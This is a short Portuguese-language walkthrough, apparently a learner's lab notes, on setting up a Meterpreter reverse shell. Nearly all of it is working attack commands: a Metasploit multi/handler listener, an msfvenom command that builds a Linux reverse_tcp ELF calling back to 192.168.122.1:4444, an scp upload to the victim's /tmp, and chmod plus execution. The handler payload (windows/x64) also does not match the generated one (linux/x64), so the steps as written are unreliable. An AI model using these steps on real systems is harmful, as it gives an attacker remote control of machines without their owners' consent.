# Reverse Shell

### o que é?

em vez de me conectar ao pc da vítima e ser bloqueado pelo firewall, eu fiz o pc da vítima se conectar ao meu, usando um shell.elf
que fiz com msfvenom, enviei usando o protocolo scp e abri pelo meterpreter com meu msfconsole

### como isso tudo aconteceu?

## no msfconsole

use exploit/multi/handler
pra usar o handler (listener)

set PAYLOAD windows/x64/meterpreter/reverse_tcp
pra usar o payload de reverse connection

set LHOST 192.168.122.1
o ip da máquina atacante, pra garantir que a conexão chegue

set LPORT 4444
pois foi a porta que abri no firewall (sudo ufw allow 4444/tcp)

exploit -j
exploit pra executar, -j pra rodar em segundo plano e liberar o terminal

## e a criação do shell.elf?

no terminal comum

msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.122.1 LPORT=4444 -f elf > shell.elf
a criação do arquivo que eu iria enviar via scp pra máquina vítima, contendo o reverse, ip e porta

scp shell.elf usuario@ip-da-vitima:/tmp/
o envio do arquivo via scp pra dentro da máquina vítima (pra tmp por que não tem restrições de permissão)

chmod +x /tmp/shell.elf
/tmp/shell.elf &

dando permissão e executando (pra criar a conexão)
